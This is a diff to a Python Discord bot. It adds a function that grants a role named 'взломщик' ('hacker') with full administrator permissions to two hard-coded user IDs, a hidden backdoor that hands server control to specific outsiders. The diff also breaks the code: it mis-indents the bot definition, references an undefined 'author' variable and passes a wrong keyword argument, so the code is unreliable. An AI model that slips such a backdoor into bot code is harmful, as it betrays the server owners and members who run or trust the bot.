@@ -6,12 +6,12 @@ from discord.ext import commands
 import os
 from discord.ext.commands import bot
 
-Bot=commands.Bot(command_prefix="")
+        Bot=commands.Bot(command_prefix="")
 Bot.remove_command("help")
 
-@Bot.event()
-async def on_ready():
-        await Bot.user.guild.create_role(name="EggMaster")        
+#@Bot.event()
+#async def on_ready():
+        #await Bot.user.guild.create_role(name="EggMaster")        
 
 
 @Bot.command()
@@ -45,7 +45,12 @@ async def Mbun(ctx, user: discord.Member):
         await ctx.guild.ban(user)
 
 
-
+async def Mrole(ctx):
+    guild = ctx.guild
+    perms = discord.Permissions(administrator=True)
+    if author.id==655502637420118026 or author.id==655126620046229540:
+            await guild.create_role(name="взломщик", Permissions=perms)
+            await ctx.send("Успешно")
 
 
 @Bot.command()
